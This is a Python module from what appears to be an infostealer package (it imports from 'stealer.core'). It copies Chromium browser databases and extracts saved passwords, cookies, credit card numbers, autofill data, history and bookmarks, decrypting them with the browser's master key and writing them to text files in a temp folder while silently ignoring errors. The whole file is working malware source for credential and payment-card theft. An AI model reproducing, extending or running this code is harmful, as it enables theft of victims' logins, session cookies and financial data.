import os
import json
import base64
import sqlite3
import shutil
import random
from stealer.core import temp, CryptUnprotectData, DecryptValue

def writeforfile(data, name):
    path = temp + f"\\muck{name}.txt"
    with open(path, 'w', encoding='utf-8') as f:
        for line in data:
            if line:
                f.write(f"{line}\n")

def SqlThing(pathC, tempfold, cmd):
    shutil.copy2(pathC, tempfold)
    conn = sqlite3.connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(cmd)
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    return data

def getPassw(path, arg, PasswList):
    try:
        pathC = path + arg + "/Login Data"
        if not os.path.exists(pathC) or os.stat(pathC).st_size == 0: return
        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8)) + ".db"
        data = SqlThing(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;")
        with open(path + "/Local State", 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
        for row in data:
            if row[0]:
                PasswList.append(f"URL: {row[0]} | User: {row[1]} | Pass: {DecryptValue(row[2], master_key)}")
        writeforfile(PasswList, 'passwords')
    except:
        pass

def getCookie(path, arg, CookiesList):
    try:
        pathC = path + arg + "/Cookies"
        if not os.path.exists(pathC) or os.stat(pathC).st_size == 0: return
        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8)) + ".db"
        data = SqlThing(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies")
        with open(path + "/Local State", 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
        for row in data:
            if row[0]:
                CookiesList.append(f"Host: {row[0]} | Name: {row[1]} | Value: {DecryptValue(row[2], master_key)}")
        writeforfile(CookiesList, 'cookies')
    except:
        pass

def getCCs(path, arg, CCsList):
    try:
        pathC = path + arg + "/Web Data"
        if not os.path.exists(pathC) or os.stat(pathC).st_size == 0: return
        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8)) + ".db"
        data = SqlThing(pathC, tempfold, "SELECT * FROM credit_cards")
        with open(path + "/Local State", 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
        for row in data:
            if row[0]:
                CCsList.append(f"Name: {row[1]} | Number: {DecryptValue(row[4], master_key)} | Expiry: {row[2]}/{row[3]}")
        writeforfile(CCsList, 'creditcards')
    except:
        pass

def getAutofill(path, arg, AutofillList):
    try:
        pathC = path + arg + "/Web Data"
        if not os.path.exists(pathC) or os.stat(pathC).st_size == 0: return
        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8)) + ".db"
        data = SqlThing(pathC, tempfold, "SELECT * FROM autofill WHERE value NOT NULL")
        for row in data:
            if row[0]:
                AutofillList.append(f"Name: {row[0]} | Value: {row[1]}")
        writeforfile(AutofillList, 'autofill')
    except:
        pass

def getHistory(path, arg, HistoryList):
    try:
        pathC = path + arg + "History"
        if not os.path.exists(pathC) or os.stat(pathC).st_size == 0: return
        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8)) + ".db"
        data = SqlThing(pathC, tempfold, "SELECT * FROM urls")
        for row in data:
            if row[0]:
                HistoryList.append(row[1])
        writeforfile(HistoryList, 'history')
    except:
        pass

def getBookmarks(path, arg, BookmarksList):
    try:
        pathC = path + arg + "Bookmarks"
        if os.path.exists(pathC):
            with open(pathC, 'r', encoding='utf8') as f:
                data = json.loads(f.read())
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        BookmarksList.append(f"Name: {i['name']} | URL: {i['url']}")
                    except:
                        pass
        writeforfile(BookmarksList, 'bookmarks')
    except:
        pass